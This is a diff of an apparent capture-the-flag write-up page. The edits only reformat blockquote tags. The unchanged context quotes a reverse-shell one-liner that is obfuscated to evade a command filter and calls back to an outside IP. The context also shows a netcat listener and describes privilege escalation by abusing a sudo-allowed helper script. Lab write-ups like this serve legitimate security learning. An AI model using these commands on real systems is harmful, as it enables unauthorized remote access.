@@ -96,7 +96,8 @@ Nmap done: 1 IP address (1 host up) scanned in 278.41 seconds
 <p>if we try to bypass the filter, we could try tweak it like this before running it:</p>
 <p><code>b\ash -c 'exec b\ash -i &amp;&gt;/dev/tcp/10.13.0.34/2112 &lt;&amp;1'</code></p>
 <blockquote>
-<p>NOTE: Make sure to do a <code>nc -nlvp 2112</code> before running the command.</p></blockquote>
+<p>NOTE: Make sure to do a <code>nc -nlvp 2112</code> before running the command.</p>
+</blockquote>
 <p><img src="https://i.imgur.com/ZyxEwk2.png" alt=""></p>
 <p>That worked, we now have our initial access to the machine.</p>
 <h2 id="escalating-privs">Escalating Privs</h2>
@@ -104,10 +105,12 @@ Nmap done: 1 IP address (1 host up) scanned in 278.41 seconds
 <p><img src="https://i.imgur.com/6QtEZAY.png" alt=""></p>
 <p>We can see the only command we can run is a file called <code>.helpline.sh</code> from the user <code>apaar</code>. If we check the contents of that file we see some information of what it does. It seems to just pass any input the user provides and since this file is running with root permissions, we can pretty much use it to get higher privs. Let&rsquo;s try it out by invoking bash:</p>
 <blockquote>
-<p>NOTE: Notice we execute the file using <code>sudo -u apaar</code> otherwise the bash session will still get opened as the current user <code>www-data</code>.</p></blockquote>
+<p>NOTE: Notice we execute the file using <code>sudo -u apaar</code> otherwise the bash session will still get opened as the current user <code>www-data</code>.</p>
+</blockquote>
 <p><img src="https://i.imgur.com/TIKFaVe.png" alt=""></p>
 <blockquote>
-<p>R.I.P Neil Peart.</p></blockquote>
+<p>R.I.P Neil Peart.</p>
+</blockquote>
 <h2 id="getting-the-first-flag">Getting the first flag</h2>
 <p>Now we have have escaped from the limiter user, let&rsquo;s see if Apaar has our first flag:</p>
 <p><img src="https://i.imgur.com/qEjSmYZ.png" alt=""></p>
